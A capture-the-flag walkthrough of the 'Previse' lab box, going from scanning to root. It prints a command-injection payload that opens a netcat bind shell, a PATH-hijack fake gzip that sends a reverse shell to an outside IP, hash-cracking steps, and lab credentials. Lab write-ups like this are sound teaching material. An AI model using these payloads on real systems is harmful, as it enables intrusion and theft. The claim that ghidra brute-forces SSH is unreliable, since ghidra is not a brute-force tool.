Previse

# **Previse**
##  Nmap scan results
```bash
nmap -A -Pn 10.10.11.104
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 03:39 EDT
Nmap scan report for 10.10.11.104
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.58 seconds
```
We can see from this nmap scan that this machine is running SSH and HTTP.  
SSH can be bruteforced via tools like `ghidra` but we do not know any username or password, so it is better to start off with HTTP service running on port 80.

Since default ip `10.10.11.104` redirects to `http://10.10.11.104/login.php`, we understand that this website is running PHP. Using tools like `wfuzz OR ffuf OR dirb OR dirbuster OR gobuster` can help us find other PHP pages. I will pick ffuf because it is faster.

```bash┌──(kali㉿kali)-[~]
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.11.104/FUZZ -e .php -mc 200,301,302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.104/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302
________________________________________________

                        [Status: 302, Size: 2801, Words: 737, Lines: 72]
accounts.php            [Status: 302, Size: 3994, Words: 1096, Lines: 94]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10]
download.php            [Status: 302, Size: 0, Words: 1, Lines: 1]
favicon.ico             [Status: 200, Size: 15400, Words: 15, Lines: 10]
files.php               [Status: 302, Size: 6075, Words: 1995, Lines: 131]
footer.php              [Status: 200, Size: 217, Words: 10, Lines: 6]
header.php              [Status: 200, Size: 980, Words: 183, Lines: 21]
index.php               [Status: 302, Size: 2801, Words: 737, Lines: 72]
index.php               [Status: 302, Size: 2801, Words: 737, Lines: 72]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10]
login.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
logs.php                [Status: 302, Size: 0, Words: 1, Lines: 1]
nav.php                 [Status: 200, Size: 1248, Words: 462, Lines: 32]
status.php              [Status: 302, Size: 2970, Words: 749, Lines: 75]
:: Progress: [9228/9228] :: Job [1/1] :: 320 req/sec :: Duration: [0:00:39] :: Errors: 0 ::

```
Here interesting pages are:
(200 OK)
```
config.php, 
nav.php,
```
(302 Redirect)
```
files.php, 
download.php, 
accounts.php
```

config.php is empty page with 0 length, but nav.php shows some valuable information about navigation on the site:
![eb28c0d0a939136a416287a2581901e9.png](../_resources/0ad7041589084a77b78c5c49c57df554.png)
But every link on this navigation page redirects to the default login page `http://10.10.11.104/login.php`

Clicking files.php on this page and intercepting the request via burp suite shows that server actually sends us `files.php` but it then immediately redirects to `login.php` so we do not see files.php in our browser.

Below is a part of `files.php` source code from burp suite:
![46278d7b74d70cfc6dde148438019737.png](../_resources/a256828fd3c94fdb8175d40f2264df6f.png)

We can also access status.php to see there is MySQL service running in the background and there are 10 admins and 2 uploaded files on this website.
![2e3f6bd63a9aa6d87add75ea4dfff8e5.png](../_resources/658bee3583f847589f631c2bf1c2c905.png)

Accounts.php is interesting. To bypass 302 redirection on this site we can simply change the HTTP header from `302 Found` to `200 OK`. (Notice the change in the first line)
![235246d5eea4470bb2ff122075a12af1.png](../_resources/5308ec2b5ed74394a25312ad15faa879.png)
![62d51f804153c9dbd1cdba9634208bcd.png](../_resources/c0b0ab6a3cb24d00aecc166cff5a8424.png)
From this accounts.php page I created an account with `id:ubuntu and password:linux`

Logging in with these credentials gives us access to management panel.
![7d362d2d4853370c1f2c099aad1f8577.png](../_resources/ea441bcd7afd489ca3f9b907e1a73a7b.png)

From this page we can download both files. Unzipping sitebackup.zip we can access config.php where we can find a username and password stored.
![d69233d3c34d9d46fa75246ca608af82.png](../_resources/59370de0bcc14d4191c9e4063206f887.png)
![eb07f555ecc2f6e7e49ae13fe376c316.png](../_resources/9791b57d452645a5a455e115baf791bb.png)

I tried to login SSH with these `root:mySQL_p@ssw0rd!:)` credentials but without success.

Another file on that zip named `logs.php` shows a code that may be vulnerable to ` code injecton` because there seems to be no user input sanitization.
![bfd49c8e0d79f3ea100d8cd6683517b1.png](../_resources/dc39b2a5a9e24664b638a942ef28af3b.png)

We can try to inject code in `file_logs.php` to gain a shell. To do this we close echo command with `&` and then write our own shell command (nc)
![b62f71ee3f1ce236fa822940fe9e0224.png](../_resources/69c57e407eb74b32abf5c27cd2294bf2.png)

Final payload:
`echo $output & nc -lvnp 1234 -e /bin/bash`

URL encoded payload to be sent via BURP:
`%26nc%20-lvnp%201234%20-e%20%2Fbin%2Fbash`

Below is an image of delim=comma+our URL-encoded payload. Forwarding this request executes `nc -lvnp 1234 -e /bin/bash` command on this web server, so it starts listening to ANY on port 1234, a.k.a. bind shell.
![77c951f35e5044e0d8e252eb2abd5905.png](../_resources/bd43c5308eef45f591994c7029a199ab.png)

We can now connect to its 1234th port with this command in our kali box:
`nc 10.10.11.104 1234`
![7b29117d73f514c4a487f120338d8e90.png](../_resources/34834d2cde084928ab6591722a8d0392.png)

To make the shell more interactive, use the command:
`python -c "import pty;pty.spawn('/bin/bash')"
`
![5e708dfc358535b87213a414601eebae.png](../_resources/11354d2f0ca84e75b740eeb83a43432b.png)

Then using previously discovered credentials `root:mySQL_p@ssw0rd!:)`  we can dump accounts table:
![76a74b29ea9a352f97b02c9bd40461c6.png](../_resources/837d4d567ec64a9e8ede492f24e2252d.png)

Note the hash of the user m4lwhere: `$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.`

Cracking it with hashcat `hashcat -m 500 hashson.txt /usr/share/wordlists/rockyou.txt ` gives cleartext password:`ilovecody112235!`

Using `m4lwhere:ilovecody112235!` to ssh into the machine and reading user.txt `e8a8e264c58be755633bacd03c9624d5`
![1303b4a1d5771e184fd4b531b627c87c.png](../_resources/fb1fb4a0ab0c47aa90861b4c91a42898.png)

Privilege escalation:
![dfd6b0df2f6fd31728a7266d9cae4066.png](../_resources/fc64a43b63eb4a50a395babe38277a22.png)

from `sudo -l` command we see we can run "gzip" as root. Linux by default calls gzip from `/bin/gzip` (we can see that by running `which gzip`)

Using path injection, we can create our own gzip executable and make this script call our gzip instead.
![7774b0de5fecaf6108cb4b1bac2d0a63.png](../_resources/1f163b6179b6471494ffefce601dea4a.png)

Commands:
```bash
cd /tmp
echo "nc 10.10.15.9 1547 -e /bin/bash" > gzip
chmod 777 gzip
export PATH=/tmp:$PATH
```

Now when this script calls gzip, it will execute `/tmp/gzip
` (not default /bin/gzip)

Run this script as sudo:
![98ee0d97a709e7a43d349ed0171b667b.png](../_resources/fd72bd51403541e5af7ff9a793daa112.png)

And catch the incoming connection request with netcat: `nc -lvnp 1547`
![ff92da0731a4275a62afbb2be553c39b.png](../_resources/c87bc83202a94e39b4b414b747038131.png)
Root flag: `2ac1090ac49d3e72b94dcc2cdcae0ea2`

Batuhan Kahraman, 05.09.2021

![9c9897434dde73d96d1b75411d4dc50e.png](../_resources/6e4187b204be4189bd14c1e9fbe38abe.png)
